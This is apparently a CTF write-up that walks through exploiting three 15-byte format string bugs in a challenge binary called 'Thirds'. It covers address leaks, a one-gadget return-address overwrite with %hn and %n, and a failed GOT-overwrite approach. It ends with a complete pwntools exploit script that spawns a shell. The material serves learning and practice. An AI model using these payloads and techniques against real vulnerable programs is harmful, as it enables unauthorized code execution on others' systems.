---
title: "GaslightCTF: Thirds Pwn Writeup"
date: 2026-08-17
categories: 
  - "reverse-engineering"
  - "pwn"
tags: 
  - "pwn"
  - "ctf"
  - "gaslightctf"
  - "binary exploitation"
  - "reverse-engineering"
---

This week I am bringing a writeup for a pwn challenge involving **three format string bugs**. Challenge comes from GaslightCTF, catered towards the beginners side. `Thirds` challenge was a straightforward challenge that helped me further practice my skills in format string exploitation. Honestly, it has been a long while since I encountered a format strings pwn challenge, it was good change of scenery for me, while also being quite informative.

## First Look

Binary has partial relro with other usual security flags enabled. Looking at the ghidra, there is only one function of interest; main:

```cpp
undefined8 main(void)
{
  long in_FS_OFFSET;
  char local_48 [16];
  char local_38 [16];
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("1> ");
  fgets(local_48,0x10,stdin);
  printf(local_48);
  printf("2> ");
  fgets(local_38,0x10,stdin);
  printf(local_38);
  printf("3> ");
  fgets(local_28,0x10,stdin);
  printf(local_28);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

It is quite straightforward: three format string bugs, each writing to their own 16 bytes buffers. Each input is bounded by 16bytes fgets read: `Meaning we can only provide 15 bytes!`. That fact is a crucial point in this challenge, being limited to 15 bytes in each call is quite a limitation!

During the CTF, I have explored three different ways to exploit these bugs, two of them worked and one failed:

1. Overwrite printf GOT entry to -> system: FAIL
2. Overwrite return address on stack using %n: SUCCESS
3. Overwrite return address on stack using one %hn:  SUCCESS

I will go over each method and how it works separately.

## Return Address Overwrite

Given the small buffer sizes, things we can do is limited. I don't see a way how we can do a proper rop chain, and GOT overwrite was useless (I will probably discuss this more down there somewhere). So I was left with only one choice: `Overwrite the return address with a one gadget`. Before we come to that, we need to leak some memory addresses to handle PIE/ASLR/Stack etc. 

### Leaking 

Let's first have a look at stack and see what is available for leakage:

![Stack](/assets/img/thirds_stack.png)

1. This is canary, since we are not dealing with buffer overflows, it is not needed.

2. This looks like an address pointing to somewhere in stack - Can be used to find the return address in stack.

3. We can see the return address marked at three: `__libc_start_call_main+117`. This is a great start, main returns back to a libc address: `Modifying this address to a libc address like one gadgets is easier, since small number of byte changes is needed.`. 

4. Pointing to `main` - PIE leak. We would need this for GOT overwrite if GOT overwrite had worked.

Okay, how do we leak? We use the first format string bug to print stuff from stack. Since we are limited by 15 bytes input, the usual `%p %p %p %p...` isn't enough, I tried using indexes and after a bit trial and error I found it:

```python
# Input of user appers at index 6 in stack
inp_offset = 6
canary_pos = inp_offset + 7
stack_pos  = inp_offset + 8
ret_pos = inp_offset + 9

payload1 = f"%{ret_pos}$p %{stack_pos}$p".encode()
io.sendline(payload1)
```

This will print the addresses from the stack and then we read and process it to find libc base and return address:

```python
# Prints:  
# Leak line: b'1> 0x7f2324541285    0x7ffc4567b4b0\n'
leak_line2 = io.recvline()
print(f"Leak line: {leak_line2}")

# Split by space and extract the addresses
leaked_ret = int(leak_line2.strip().split()[1], 16)
leaked_stack = int(leak_line2.strip().split()[2], 16)
libc.address = leaked_ret - (libc.symbols.__libc_start_call_main+117)

# Tested a few times and offset to return address on stack is fixed from the leaked stack address
return_stack = leaked_stack - 0x98
```

Pretty straightforward leakage stage: Find the stack indexes where we can leak libc and stack, and read the addresses, remove offsets, and profit? First printf is used, now we know libc base and stack, next stage is the return address overwrite with a one gadget.

### One Gadgets

15 bytes limitation is tough, I don't think we can do a proper ret2libc ROP chain. What we can do is return to a one gadget in libc. Still a bit tough, but doable. Looking back at the return address `libc.symbols.__libc_start_call_main+117 = 0x2b285 in the given libc before ASLR`. Now let's see our one gadgets:

![Gadgets](/assets/img/thirds_gadgets.png)

If you compare the gadget addresses to return address `They all require 3 bytes change`. This means if we want to update the return address on the stack to point to a one gadget, we need to overwrite its 3 bytes. Since they all require the same number of byte changes, which one do we choose? Looking at the constraints, first one has the less number of them and they look quite mild compared to others. So I went with that one, and I actually found a easy way to test the gadget during debugging, first put a break point at the main's return : `b *main+232` and then when the main is returning we override the `rip`:

![Debug gadget](/assets/img/thirds_gadgetdebug.png)

After this continue and see if you get a shell. This let me test quickly if the gadget is worth spending time on. First one as I suspected has worked and gave me a shell. 

### 3 Bytes Overwrite

This is the most tricky part of the challenge. How can we overwrite 3 bytes using format string exploits? We got a few options:

1. One `%n`can write 4 bytes

2. One `%hn` can write 2 bytes, and we ignore the lowest byte, maybe maybe?

3. Three `%hhn` can write 3 bytes in total, one for each.

4. Two `%hn` can write 4 bytes in total, two for each

5. One `%hn` and one `%hhn` can write 3 bytes in total

First two are the solutions I managed to make it work, and other 3 is just not possible due to limited number of bytes we can provide. Any %n write will need an address stored somewhere in the stack that it can reference. So when we use two of any writes, we already fill second printf with required addresses and leftover 15 bytes isn't enough to do two writes. This leaves us with only one type of option: `We can only do one overwrite!`. So we can either do the first one or second one. Regardless, I used the second printf to store two addresses by using the fact that fgets attaches a null byte and high bytes of addresses in the stack is null:

```python
# Store return_stack and return_stack+1 addresses in second printf
payload2 = p64(return_stack) + p64(return_stack+1)[:7]
io.send(payload2)
```

These addresses appear on the stack at indexes **8 and 9**. For full 4 byte overwrite with `%n` we can use the 8th, or for 2 bytes overwrite - ignoring first byte- we can use the 9th one to refer to in format strings.

#### One `%hn` write - LUCKY SOLUTION

Okay I mentioned that we can write two bytes, and ignore the first byte of return address. How does this work really? Looking back at the return address, first byte is `0x85` and looking back at the one gadget we are trying to return to:

```
old return:    0x7ff564ee7285
gadget target: 0x7ff564fab0a6 
```

If we just overwrite second and third byte of the return address:

```
old return:    0x7ff564ee7285
gadget target: 0x7ff564fab0a6
new target:    0x7ff564fab085
```

So instead of returning to the exact point of the gadget, we are returning a bit before `to 0x85 instead of 0xa6`. **THIS IS A LUCKY SOLUTION** Where we return to happens to be a good instruction, and it also happens that running a few extra instructions before the gadget didn't prevent the shell:

![LUCKY](/assets/img/thirds_lucky.png)

It indeed worked, even though we didn't return to the gadget location. How did we do the two bytes overwrite? I stored the `return_address + 1` address in the stack 9th index in previous printf call, now all we need to do is calculate the value we want to write there (second and third byte of gadget) and send the payload:

```python
# One hn overwrite by ignoring the first byte
value = (gadget_addr >> 8) & 0xffff
payload3 = f'%{value}c%9$hn'.encode()
print(payload3)
print(len(payload3))
io.sendline(payload3)
```

Even this overwrite was taking like 12 or so bytes, 15 bytes are indeed very tight. 

#### One `%n` write - Long Solution

Before I discovered the lucky solution, I found a long and tedious way of solving this: `4 bytes overwrite with %n`. 4 bytes might seem small but you can reach billions with 4 bytes, and what happens when you print billions of characters with `%2000000000c`, well it takes like 10 minutes to print and receive them :D 

In previous printf we put the return address at 8th stack index, so now we use that to write the first 4 bytes of the return gadget. This time we are returning to the exact point of the gadget. 

```python
# One Int overwrite version, works but painful. Took 5 minutes to get all the characters
# printed and received in local!
value = gadget_addr & 0xffffffff
payload3 = f'%{value}c%8$n'.encode()
print(payload3)
print(len(payload3))
io.sendline(payload3)
```

One thing to note, depending on ASLR this payload sometimes end 1 byte longer than we can send, in those cases format string is broken and doesn't work, so I had to run it a few times to get an address on the smaller side of numbers:  900000000 instead of 1000000000 for example. Also, this took like **5 minutes** during local testing to print and receive, and remote was even slower. `1 billion characters I think equates to more than 1gb+ data transfer`. So I thought it wasn't a viable solution for the remote and I looked for the other solution I described above. Still it was fun to see the cursor going down and down endlessly :D  


## GOT Overwrite

This one was a failed approach but I think there is benefit in understanding why this failed and when it wouldn't fail. This way when I come across a similar challenge, this could be a viable solution. Let's summarize how this approach could work in principle, given enough buffers:

1. First printf: Leak Libc and PIE - we need both for this
2. Second printf: Override GOT entry for printf to target libc's system.
3. Third printf: Send /bin/sh as the input 

So if we can achieve all of these, third printf becomes: `system('/bin/sh') -> SHELL`. Sounds easy enough, but there is a big problem: `15 bytes is too small to fit a payload to do this overwrite`. Let's assume and go with the most easiest case where we need to only modify one byte of printf's GOT entry:

```
p64(GOT_addr) + %5c%9$hhn
```

This is a bare minimum assumption: we are modifying the first byte of GOT_addr with 0x05 value and that address should be at stack index 9, hhn is single byte write. It is a made up example with minimal sizes and changes, normal overwrite of GOT_addr required 2 bytes overwrite. `But even with this minimal example, we can't fit this payload to 15 bytes`. What this means is we can't overwrite printf GOT with the second printf, and we can't also modify it in two printf: one because it does get called, so we can't separate modification into chunks, two because we also need a way to provide `/bin/sh/`. This could have been a viable solution if we could maybe write 24 bytes or so. 

## Final Solution

Here I embedded two solutions into my solve script. If you want to try it, comment out the solutions appropriately to run the right solution. 

```python
from pwn import *

exe = "./thirds"

context.log_level = "info"
elf = context.binary = ELF(exe)
libc = ELF("./libc.so.6")

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Ubuntu']


def start():
    if args.REMOTE:
        return remote('facbc8d2-0b9f-4a0c-950d-fba332ddcbc1.play.gaslightctf.cooking', 31337, ssl=True)
    elif args.GDB:
        return gdb.debug(exe, gdbscript="""
            b *main+232
            continue
        """)
    else:
        return process(exe)

io = start()

inp_offset = 6
canary_pos = inp_offset + 7
stack_pos  = inp_offset + 8
ret_pos = inp_offset + 9

payload1 = f"%{ret_pos}$p    %{stack_pos}$p".encode()
io.sendline(payload1)


leak_line2 = io.recvline()
print(f"Leak line: {leak_line2}")
print(f"Libc return: {hex(libc.symbols.__libc_start_call_main+117)}")

leaked_ret = int(leak_line2.strip().split()[1], 16)
leaked_stack = int(leak_line2.strip().split()[2], 16)
libc.address = leaked_ret - (libc.symbols.__libc_start_call_main+117)
return_stack = leaked_stack - 0x98

print(f"LIBC:   {hex(libc.address)}")
print(f"Return: {hex(return_stack)}")
print(f"Printf: {hex(libc.symbols.printf)}")
print(f"System: {hex(libc.symbols.system)}")
print(f"Execve: {hex(libc.symbols.execve)}")

# Gadget found by using one_gadget
gadget_addr = libc.address + 0xef0a6
old_retaddr = libc.symbols.__libc_start_call_main+117

print(f"old return:    {hex(old_retaddr)}")
print(f"gadget target: {hex(gadget_addr)}")

# Store return_stack and return_stack+1 addresses in second printf
# We technically need one of them, but this makes testing two solutions easier
payload2 = p64(return_stack) + p64(return_stack+1)[:7]
io.send(payload2)

# One hn overwrite by ignoring the first byte
value = (gadget_addr >> 8) & 0xffff
payload3 = f'%{value}c%9$hn'.encode()
print(payload3)
print(len(payload3))
io.sendline(payload3)

# # One Int overwrite version, works but painful. Took 5 minutes to get all the characters
# # printed and received in local!
# value = gadget_addr & 0xffffffff
# payload3 = f'%{value}c%8$n'.encode()
# print(payload3)
# print(len(payload3))
# io.sendline(payload3)

io.interactive()

# Two overwrites version - DOESN'T WORK
# value2 = gadget_addr & 0xffff
# value3 = (gadget_addr >> 16) & 0xff
# payload2 = f'%{value2}c%8$hn'.encode()
# payload3 = f'%{value3}c%9$n'.encode()
# payload4 = payload2 + payload3 
# print(payload2)
# print(len(payload2))
# print(payload3)
# print(len(payload3))
# print(payload4)
# print(len(payload4))
```

## Closing

Fun challenge with limited budgets for format string exploitation. I was used to pwntool's format string payload generator. This challenge made me realize that and force me to write my payloads manually. Pwntool's generator wasn't really designed for 15 bytes buffer budget. I am happy that I managed to solve this and learn some new tricks and tips for format string exploitation. Looking forward to next challenges, as always keep learning!